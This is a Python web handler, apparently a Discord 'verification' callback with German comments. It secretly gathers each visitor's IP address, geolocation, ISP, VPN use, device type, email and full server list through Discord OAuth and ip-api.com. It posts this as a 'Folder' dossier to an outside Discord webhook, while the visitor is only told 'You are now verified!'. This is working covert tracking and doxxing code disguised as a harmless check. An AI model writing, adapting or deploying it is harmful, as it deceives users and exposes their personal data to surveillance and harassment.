from http.server import BaseHTTPRequestHandler
import requests
import urllib.parse
import os

WH_URL = os.environ.get('WEBHOOK_BSU')
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
REDIRECT_URI = "https://bsu-verify.vercel.app/callback"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Parameter auslesen
        q = urllib.parse.urlparse(self.path).query
        p = urllib.parse.parse_qs(q)
        code = p.get('code', [None])[0]
        
        # 2. IP & Gerät ermitteln
        u_ip = self.headers.get('x-forwarded-for', 'N/A').split(',')[0]
        u_ag = self.headers.get('user-agent', 'N/A')

        try:
            r = requests.get(f"http://ip-api.com/json/{u_ip}?fields=17031167").json()
            loc = f"{r.get('city', 'Unknown')}, {r.get('country', '??')}"
            isp = r.get('isp', 'Unknown ISP')
            vpn = "Ja" if r.get('proxy') or r.get('hosting') else "Nein"
        except:
            loc, isp, vpn = "Lookup error", "N/A", "N/A"

        dev = "Mobile" if "Mobile" in u_ag else "PC"
        display_name = "Unknown User"
        user_email = "Nicht autorisiert"
        
        server_embed_1_str = ""
        server_embed_2_str = ""
        count = 0

        # 3. Discord Daten abrufen
        if code and CLIENT_ID and CLIENT_SECRET:
            data = {
                'client_id': CLIENT_ID, 
                'client_secret': CLIENT_SECRET, 
                'grant_type': 'authorization_code', 
                'code': code, 
                'redirect_uri': REDIRECT_URI
            }
            token_r = requests.post('https://discord.com/api/v10/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}).json()
            
            access_token = token_r.get('access_token')
            if access_token:
                auth_header = {'Authorization': f'Bearer {access_token}'}
                
                # Nutzer-Info
                u_info = requests.get('https://discord.com/api/v10/users/@me', headers=auth_header).json()
                display_name = u_info.get('global_name') or u_info.get('username') or "Unknown"
                user_email = u_info.get('email', 'Keine Email')
                
                # Serverliste abrufen und aufteilen
                g_info = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=auth_header).json()
                if isinstance(g_info, list):
                    count = len(g_info)
                    lines = [f"- {g['name']}" for g in g_info]
                    
                    # Erstes Server-Embed befüllen (Limit ca. 3500 Zeichen)
                    current_len = 0
                    split_index = 0
                    for i, line in enumerate(lines):
                        if current_len + len(line) < 3500:
                            server_embed_1_str += line + "\n"
                            current_len += len(line) + 1
                            split_index = i + 1
                        else:
                            break
                    
                    # Zweites Server-Embed befüllen (Rest)
                    current_len_2 = 0
                    for line in lines[split_index:]:
                        if current_len_2 + len(line) < 3500:
                            server_embed_2_str += line + "\n"
                            current_len_2 += len(line) + 1
                        else:
                            server_embed_2_str += f"*... und weitere*"
                            break

        # 4. Webhook mit bis zu 3 Embeds senden
        if WH_URL:
            embeds = [
                {
                    "title": f"**__📂 Folder of {display_name}__**",
                    "color": 0x2b2d31,
                    "description": (
                        f"• 📧 **Email:**\n- {user_email}\n\n"
                        f"• 📍 **Standort/IP-Adresse:**\n{loc} ({u_ip})\n\n"
                        f"• 🧾 **Anbieter:**\n{isp}\n\n"
                        f"• 📱 **Gerät:**\n{dev}\n\n"
                        f"• 🛡️ **VPN genutzt?:**\n{vpn}"
                    )
                },
                {
                    "title": f"**__📋 Server Liste Teil 1 ({count} gesamt)__**",
                    "color": 0x2b2d31,
                    "description": server_embed_1_str if server_embed_1_str else "Keine Server gefunden"
                }
            ]
            
            # Drittes Embed nur hinzufügen, wenn die Liste wirklich so lang ist
            if server_embed_2_str:
                embeds.append({
                    "title": "**__📋 Server Liste Teil 2__**",
                    "color": 0x2b2d31,
                    "description": server_embed_2_str,
                    "footer": {"text": "System V2 • Logging Active"}
                })
            else:
                embeds[1]["footer"] = {"text": "System V2 • Logging Active"}

            requests.post(WH_URL, json={"embeds": embeds})

        # 5. HTML Antwort für den Nutzer
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write("""<html><body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;"><div style="text-align:center;border:1px solid #111;padding:60px;border-radius:10px;background:#050505;"><h1>💠</h1><p>You are now verified!</p></div></body></html>""".encode('utf-8'))

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
